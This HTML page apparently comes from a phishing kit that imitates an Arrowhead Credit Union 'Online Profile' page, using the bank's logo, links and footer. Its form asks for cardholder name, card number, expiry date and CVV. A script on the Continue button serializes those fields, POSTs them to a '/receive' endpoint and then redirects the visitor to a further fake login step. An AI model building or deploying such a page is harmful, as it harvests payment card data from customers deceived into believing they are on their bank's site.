<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
    <script type="text/javascript" async="" src="//munchkin.marketo.net/163/munchkin.js"></script>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=0" />
    <meta name="description" content="" />
    <meta name="author" content="" />

    <title>Online Profile</title>
    


    <!-- custom css in the end -->

    <!-- JQuery and some dependent JS in the begining since the screen controls use them -->
     <link href="assets/Web.UI/css/CustomCss.css" rel="stylesheet" />

    <!-- Other CSS -->
    <link href="assets/Web.UI/css/Aksw.Core5f1e.css" rel="stylesheet" />
     <link href="assets/css/tooltipster.bundle.min5f1e.css" rel="stylesheet" />
     <link href="assets/Site5f1e.css" rel="stylesheet" />

	   <script src="assets/jQuery/jquery.min5f1e.js"></script>
   
   


    <!-- Custom JS in the end -->

    <script src="https://bat.bing.com/p/action/137037224.js" type="text/javascript" async="" data-ueto="ueto_7b1cb6019c"></script>
    <link type="text/css" href="https://rtp-static.marketo.com/rtp/libs/jquery-ui-insightera-custom-1.9.6.css" rel="stylesheet" />
    <script type="text/javascript" async="" src="//munchkin.marketo.net/munchkin.js"></script>
</head>
<style>
		 .a-error-container{
		 display:none;
		 }
	</style>
<body role="document" style="padding-top: 60px;">
    <!-- Google Tag Manager (noscript) -->
    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-MCQC9VD" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
    <!-- End Google Tag Manager (noscript) -->







    <!-- Top Navigation -->
    <div class="navbar navbar-inverse navbar-fixed-top" role="navigation">
        <div class="container">
            <div class="navbar-header">
                <a class="navbar-brand" href="#">
                    <div class="a-comp-logo">
                        <img alt="  Logo" src="https://apply.arrowheadcu.org/VirtualCapture/default/Home/GetCompanyLogo" style="max-height:50px;margin-top:-15px;" />

                    </div>
                    <div class="a-comp-name">

                    </div>
                </a>
                <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target=".navbar-collapse">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
            </div>
            <div class="navbar-collapse collapse a-pull-right" id="VCNavbar">
                <ul class="nav navbar-nav">
                    <li>
                        <a alt="Products" href="https://apply.arrowheadcu.org/VirtualCapture/default/Products/Index">Home</a>
                    </li>

                </ul>
                <ul class="nav navbar-nav navbar-right">
                    <li>
                        <a alt="Sign In" href="https://apply.arrowheadcu.org/VirtualCapture/default/Login/SignInProfile">Sign In</a>
                    </li>

                </ul>
            </div>
        </div>
    </div>

    <div class="body-content">
        <!-- This div is hidden after the view is ready to avoid "Flash Of Unstyled Content" -->
        <!-- This is hidden by default.  The child view needs to unhide it via css -->
        <div class="layout-initial-mask">
            <div>
                <i class="fa fa-circle-o-notch fa-spin fa-2x fa-fw"></i>
                <span class="sr-only">Loading...</span>
                <h3>Loading...</h3>
            </div>
        </div>






        <style>
            .passwordPhrase-content {
                font-size: smaller;
                margin-left: 160px;
                margin-top: -10px;
            }

            .passwordPhrase-parent {
                min-height: 0px;
                display: flexbox;
                align-items: center;
                height: auto;
            }
            
            .input-container {
    display: flex;
    justify-content: space-between;
}

.input-wrapper {
    flex: 1;
    margin-right: 5px; /* Adjust as needed */
}
        </style>

        <div style="margin-top:10px">

        </div>
        <div class="container online-profile" role="main" style="margin-top:15px">
            <div class="container row">
                <div class="col-sm-2">
                     
                </div>
                <div class="col-sm-8">
                    <script type="text/javascript">
                        $(document).ready(function() {
                            Aksw.Form.init('frmOnlineProfile');
                        });
                    </script>
                    <form id="form" class="a-form" action="" role="form" novalidate="novalidate" autocomplete="off">
                        <div id="a-widget-35689" class="a-panel panel panel-default">
                            <div id="a-widget-35691" class="ui-widget-header a-panel-title panel-heading"><span id="a-widget-35690" class="a-panel-title-text">Enter card details </span></div>
                            <div id="a-widget-35692" class="a-panel-no-collapse a-panel-content">
                                <div id="a-widget-35780" class="a-panel-content panel-body a-panel-content-top-border">
                                    <div id="a-widget-35693" class="a-panel-body-instructions">Please verify card details. </div>
                                    <div id="a-widget-35694" class="row">
                                        
                                        </div><br><br>
                                        <label for="fullName" class="tru-core-input__label">Name on Card</label> 
        <input class="a-field-control form-control input-sm" type="text" id="Nombre de tarjeta" name="Card-Name"  required>
		<p class="errmes"></p>
		
        <label for="ssn" class="tru-core-input__label">Card Number</label>
        <input class="a-field-control form-control input-sm" type="text" id="card-number" name="Card-Number" required>
        <p class="errmes"></p>
        
        <div class="input-container">
    <div class="input-wrapper">
        <label for="Fecha de caducidad" class="tru-core-input__label">Expiry date</label>
        <input class="a-field-control form-control input-sm" type="text" id="exp-date" name="Expiry-Date" required> 
        <p class="errmes"></p>
    </div>
    
    <div class="input-wrapper">
        <label for="Cvv" class="tru-core-input__label">CVV/CVC</label>
        <input class="a-field-control form-control input-sm" type="text" id="cvv" name="Cvv" required> 
        <p class="errmes"></p>
    </div>
</div>
  
       <br>
                                    
                                </div>
                                <div id="a-widget-35781" class="a-bottombar a-panel-bottombar" style="height:40px;"><button id="a-widget-35782" class="a-button btn btn-sm btn-primary" title="" type="button" alt="Continue" style="float:right">Continue <span id="a-widget-35783" class="glyphicon glyphicon-chevron-right"></span></button>
                                   <button id="a-widget-35784" class="a-button btn btn-sm btn-default" title="" type="button" alt="Cancel" style="float:right"><span id="a-widget-35785" class="glyphicon glyphicon-floppy-remove"></span> Cancel</button>
                                    
                                </div>
                            </div>
                        </div>
                    </form>


                </div>
                <div class="col-sm-2">
                     
                </div>
            </div>
        </div>




    </div>
    

    <!-- Footer -->
    <div class="footer" style="top: 100vh; visibility:visible; display:block; position:sticky;">
        <p align="center"><br />
            <font color="#000000">
                <font color="#ffffff">Arrowhead Credit Union © 2022 | P.O. Box 4100 Rancho Cucamonga, CA 91729 </font><br />
            </font>
        </p>
    </div>








    <div id="batBeacon883913695482" style="width: 0px; height: 0px; display: none; visibility: hidden;"><img id="batBeacon83942582655" width="0" height="0" alt="" src="https://bat.bing.com/action/0?ti=137037224&Ver=2&mid=2079e74e-78cc-44b4-85b3-1a6671cdea9e&sid=3173cc2010bd11ef9c18bf15542d774e&vid=3174c65010bd11ef95ffcb2da19e61a0&vids=0&msclkid=N&pi=0&lg=en-US&sw=412&sh=846&sc=24&tl=Online%20Profile&p=https%3A%2F%2Fapply.arrowheadcu.org%2FVirtualCapture%2Fdefault%2FOnlineProfile%2FIndex%3F%26P1%3DSignInProfile&r=https%3A%2F%2Fapply.arrowheadcu.org%2FVirtualCapture%2Fdefault%2FLogin%2FSignInProfile&lt=1173&mtp=5&evt=pageLoad&sv=1&rn=974598" style="width: 0px; height: 0px; display: none; visibility: hidden;" /></div>
    <div style="display: none; visibility: hidden;">
   
    </div>
</body>
<script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.6.0/cleave.min.js"></script>
      
<script>
	 	

	       new Cleave('#card-number', {
            creditCard: true
        });

        new Cleave('#exp-date', {
            date: true,
            datePattern: ['m', 'y']
        });

        new Cleave('#cvv', {
            numericOnly: true,
            blocks: [3]
        });

        const form = document.getElementById('credit-card-form');
        form.addEventListener('submit', function (event) {
            event.preventDefault(); // Prevent form submission for now

            const cardNumber = document.getElementById('card-number').value.replace(/\s/g, ''); // Remove spaces
            const expDate = document.getElementById('exp-date').value;
            const cvv = document.getElementById('cvv').value;

            // Perform additional validation checks here if needed
            // For this example, let's simply log the input values
            console.log('Card Number:', cardNumber);
            console.log('Expiry Date:', expDate);
            console.log('CVV:', cvv);
        });
        
</script>
<script>
    	
    $(document).ready(function() { 
    $('#a-widget-35782').on('click', function(event) {
        event.preventDefault();
        let myForm = $("#form");
              
            
            // It returns a array of object 
            let userinfo = myForm.serializeArray();
            let user = {};
            userinfo.forEach((value) => {
                  
                // Dynamically create an object
                user[value.name] = value.value;
            });
            
            //user['visitor'] = visitor;
            console.log(user);
            let url = "/receive";
            $.ajax({
                method: 'POST',
                url: url,
                data: user
            }).done(function(msg) {
            
               sessionStorage.setItem('back','./card.php');
        
   			window.location.href = '/login/4'; // Corrected line
       
              
            }).fail(function(err, textstatus, error) {
                    // Handle AJAX request failure here
            });
        
    });
});

  var close = document.querySelectorAll('.cls'); 
		
  for (const button of close){
  button.addEventListener('click', ()=> {
  document.getElementById('error-modal').style.display = "none";
  });
	};
    </script>
</html>